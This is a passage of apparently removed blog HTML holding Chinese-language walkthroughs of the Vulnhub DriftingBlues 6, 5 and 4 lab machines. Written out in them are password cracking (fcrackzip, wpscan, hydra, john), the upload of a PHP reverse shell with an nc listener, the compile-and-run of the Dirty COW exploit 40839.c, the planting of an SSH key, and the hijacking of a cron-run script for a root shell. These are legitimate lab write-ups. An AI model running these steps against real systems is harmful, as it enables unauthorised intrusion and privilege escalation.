-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-6/">
-                Driftingblues 6
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues6">Driftingblues:6</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues6">名称：DriftingBlues:6</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>firefart:&#x2F;root&#x2F;flag.txt </p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues6_vhova">文件名：driftingblues6_vh.ova</span></h4><h4><span id="文件大小395mb">文件大小：395MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues6_vhova">下载地址：</span></h4><h4><span id="md5-1ef3ef660b6e129cca3d93f8fba0c94d">MD5: 1EF3EF660B6E129CCA3D93F8FBA0C94D</span></h4><h4><span id="sha1-01edac6d7ffad8b6487dd4dce021ccffd0250ce8">SHA1: 01EDAC6D7FFAD8B6487DD4DCE021CCFFD0250CE8</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues6和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-6/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了80端口，访问主页查看源码，没有过多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.118 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-6/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现有robots.txt文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.118/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="zip密码爆破">Zip密码爆破</span></h3><blockquote>
-<p>1.访问192.168.56.118&#x2F;robots.txt，得到&#x2F;textpattern&#x2F;textpattern目录存在的提示，同时提心我们关注.zip文件内容：</p>
-<p><img src="/2022/06/06/Driftingblues-6/7.png" alt="image-"></p>
-<p>2.继续访问192.168.56.118&#x2F;textpattern&#x2F;textpattern，发现是一个textpattern的管理后台登录页：</p>
-<p><img src="/2022/06/06/Driftingblues-6/8.png" alt="image-"></p>
-<p>3.根据提示，再次扫描目录，这次以.zip文件为主，找到spammer.zip：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.118/ -x zip --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录下.zip文件扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/9.png" alt="image-"></p>
-<p>4.利用fcrackzip对spammer.zip进行破解，可以得到zip内的一对用户名即密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p rockyou.txt -u /home/kali/Downloads/spammer.zip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/10.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-6/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件上传webshell">文件上传webshell</span></h3><blockquote>
-<p>1.利用得到的用户和密码登录textpattern管理后台，发现在Content-File可以上传文件：</p>
-<p><img src="/2022/06/06/Driftingblues-6/12.png" alt="image-"></p>
-<p>2.我们可以上传kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，修改ip及端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/13.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-6/14.png" alt="image-"></p>
-<p>3.在kali开启对应的端口监听，然后访问192.168.56.118&#x2F;textpattern&#x2F;files&#x2F;php-reverse-shell.php触发：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spwan(&quot;/bin/bash&quot;);&#x27;，利用python建立交互式shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="linux内核漏洞提权">Linux内核漏洞提权</span></h3><blockquote>
-<p>1.获取shell后，我们可以查看靶机系统内核，发现版本为3.2.78:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/16.png" alt="image-"></p>
-<p>2.在kali上可以利用searchsploit搜索该版本漏洞，并且有对应的利用程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.2.78</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/17.png" alt="image-"></p>
-<p>3.获取利用程序后，我们可以查看，发现程序可以修改靶机内核版本下linux用户的登录密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40839.c</span><br><span class="line">cat 40839.c</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/18.png" alt="image-"></p>
-<p>4.再次通过textpattern后台上传40839.c，并在靶机&#x2F;var&#x2F;www&#x2F;textpattern&#x2F;files目录下对其编译，运行生成程序后修改密码：</p>
-<p><img src="/2022/06/06/Driftingblues-6/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/textpattern/files</span><br><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line">./40839</span><br><span class="line"></span><br><span class="line">123，修改后的password</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们可以利用修改后的密码登录firefart用户：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/21.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-6/22.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-5/">
-                Driftingblues 5
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues5">Driftingblues:5</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues5">名称：DriftingBlues:5</span></h4><h4><span id="发布日期202138">发布日期：2021.3.8</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>gill:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues5_vhova">文件名：driftingblues5_vh.ova</span></h4><h4><span id="文件大小715mb">文件大小：715MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues5_vhova">下载地址：</span></h4><h4><span id="md5-21e0290277c1523b3e9def173ea0fa66">MD5: 21E0290277C1523B3E9DEF173EA0FA66</span></h4><h4><span id="sha1-371c270f8d2c8f65436f9bd52485e2128fc6365b">SHA1: 371C270F8D2C8F65436F9BD52485E2128FC6365B</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues5和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-5/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页查看源码，确定是wordpress搭建的页面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.117 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-5/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，都是wordpress相关的目录内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.117/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress用户密码爆破">Wordpress用户密码爆破</span></h3><blockquote>
-<p>1.扫描得到的结果都指向wordpress，则用wpscan进行扫描，可以得到5个用户及其密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 --detection-mode aggressive -e --passwords=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/7.png" alt="image-"></p>
-<p>2.但是如果使用rockyou.txt作为密码字典要跑出对应密码相当消耗时间，合理可以用cewl生成一个较小的字典，能够得到gill用户的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 6 -w drift.txt http://192.168.56.117</span><br><span class="line">wpscan --url http://192.168.56.117 --detection-mode aggressive -e u -P drift.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/8.png" alt="image-"></p>
-<p>3.进入wordpress管理后台，利用gill登录，但gill用户的权限不够，无法从wordpress后台写入webshell：</p>
-<p><img src="/2022/06/06/Driftingblues-5/9.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录初步提权">SSH登录，初步提权</span></h3><blockquote>
-<p>1.回到主页，结合目录扫描的结果，我们能在<a target="_blank" rel="noopener" href="http://192.168.56.117/wp-content/uploads/2021/02/%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8F%91%E7%8E%B0%E4%B8%BB%E9%A1%B5%E8%B0%83%E7%94%A8%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E5%85%B6%E4%B8%ADdblogo.png%E6%98%AF%E5%94%AF%E4%B8%80%E6%B2%A1%E8%A2%AB%E4%BD%BF%E7%94%A8%E5%88%B0%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8exiftool%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%EF%BC%9A">http://192.168.56.117/wp-content/uploads/2021/02/目录下发现主页调用的图片，其中dblogo.png是唯一没被使用到的图片，我们可以用exiftool查看一下：</a></p>
-<p><img src="/2022/06/06/Driftingblues-5/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool /home/kali/Downloads/dblogo.png</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/11.png" alt="image-"></p>
-<p>2.得到了ssh的密码，我们尝试登录一下，发现其实就是全小写，并且找到第一个flag，user.txt：</p>
-<p><img src="/2022/06/06/Driftingblues-5/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.可以发现文件夹有keyfile.kdbx这个密码库文件，把这个文件获取到kali，用keepass2john解一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，gill开启http服务</span><br><span class="line">wget http://192.168.56.117:8001/keyfile.kdbx，kali获取密码库文件</span><br><span class="line">keepass2john keyfile.kdbx | tee hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/13.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John hash –wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/14.png" alt="image-"></p>
-<p>2.得到的porsiempre并不是root的密码，我们再把keyfile.kdbx放在<a target="_blank" rel="noopener" href="https://app.keeweb.info/%E6%89%93%E5%BC%80%EF%BC%8C%E5%BE%97%E5%88%B0%E7%9A%846%E4%B8%AA%E5%AF%86%E7%A0%81%E4%B9%9F%E4%B8%8D%E6%98%AFroot%E5%AF%86%E7%A0%81%EF%BC%9A">https://app.keeweb.info/打开，得到的6个密码也不是root密码：</a></p>
-<p><img src="/2022/06/06/Driftingblues-5/15.png" alt="image-"></p>
-<p>3.回到gill用户下，查看具有sudo权限的应用，没有发现明显可用的应用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/16.png" alt="image-"></p>
-<p>4.利用linpeas.sh进行扫描，发现root下有&#x2F;keyfolder这个目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开放http服务</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，gill获取linpeas工具</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/17.png" alt="image-"></p>
-<p>5.我们查看&#x2F;keyfolder这个目录，发现有其他用户可以在这个目录下写入：</p>
-<p><img src="/2022/06/06/Driftingblues-5/18.png" alt="image-"></p>
-<p>6.再利用pspy64s监视进程，发现&#x2F;root&#x2F;key.sh这个进程是定时执行的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/pspy64s，gill获取pspy64s</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-5/19.png" alt="image-"></p>
-<p>7.那么我们可以边让pspy64s进行监听，进入&#x2F;keyfolder目录，将之前keyfile.kdbx内的密码一个个尝试，等待pspy64s监听到key.sh的一次执行，没有获得文件，就删去尝试的密码文件：</p>
-<p><img src="/2022/06/06/Driftingblues-5/20.png" alt="image-"></p>
-<p>8.rootcreds.txt的内容就是root用户的密码，提权后在&#x2F;root目录下能够找到第二个flag，即root.txt：</p>
-<p><img src="/2022/06/06/Driftingblues-5/21.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-5/22.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-4/">
-                Driftingblues 4
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues4">Driftingblues:4</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues4">名称：DriftingBlues:4</span></h4><h4><span id="发布日期202138">发布日期：2021.3.8</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>hubert:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues4_vhova">文件名：driftingblues4_vh.ova</span></h4><h4><span id="文件大小603mb">文件大小：603MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues4_vhova">下载地址：</span></h4><h4><span id="md5-eeea3e2332e41ce013245f18c4d4d226">MD5: EEEA3E2332E41CE013245F18C4D4D226</span></h4><h4><span id="sha1-ed30008e15b83f641b1078dd84cbd747ac2141ff">SHA1: ED30008E15B83F641B1078DD84CBD747AC2141FF</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues4和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-4/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了21，22和80端口，访问主页查看源码，有一串base64编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.116 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-4/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，没有什么太多发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.116/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="信息解密">信息解密</span></h3><blockquote>
-<p>1.对得到的base64编码字串进行四次解码，得到路径&#x2F;imfuckingmad.txt：</p>
-<p><img src="/2022/06/06/Driftingblues-4/7.png" alt="image-"></p>
-<p>2.访问后得到一串brainfuck编码，进行解码得到&#x2F;iTiS3Cr3TbiTCh.png：</p>
-<p><img src="/2022/06/06/Driftingblues-4/8.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-4/9.png" alt="image-"></p>
-<p>3.访问图片路径，是一张二维码，扫描二维码跳转到一张图片，图片内有几个用户名：</p>
-<p><img src="/2022/06/06/Driftingblues-4/10.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-4/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ftp爆破初步提权">FTP爆破，初步提权</span></h3><blockquote>
-<p>1.根据之前base64解码的提示，开始用得到的用户名进行ftp爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l luther -P rockyou.txt ftp://192.168.56.116</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/12.png" alt="image-"></p>
-<p>2.登录成功后发现的确还有hubert这个用户，发现该用户下没有.ssh目录，则可以创建.ssh目录，然后把kali的公钥上传，进行ssh免密登录：</p>
-<p><img src="/2022/06/06/Driftingblues-4/13.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-4/14.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hubert</span><br><span class="line">mkdir .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/15.png" alt="image-"></p>
-<p>3.登录hubert后，我们可以在目录下找到第一个flag，user.txt：</p>
-<p><img src="/2022/06/06/Driftingblues-4/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.可以发现文件夹下还有一个python文件，查看一下，程序是将1写入&#x2F;tmp&#x2F;backdoor_testing：</p>
-<p><img src="/2022/06/06/Driftingblues-4/17.png" alt="image-"></p>
-<p>2.我们利用pspy64s工具进行进程检测，发现emergency.py是被定时执行的，那么我们将原有的emergency.py删除，新建一个用于提权的同名文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，hubert获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/18.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f emergency.py</span><br><span class="line">vi emergency.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-4/19.png" alt="image-"></p>
-<p>3.在kali开启对应的端口监听，过一会就能收到root权限，在&#x2F;root目录下能够找到第二个flag，root.txt：</p>
-<p><img src="/2022/06/06/Driftingblues-4/20.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-3/">
-                Driftingblues 3
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues3">Driftingblues:3</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues3">名称：DriftingBlues:3</span></h4><h4><span id="发布日期202136">发布日期：2021.3.6</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
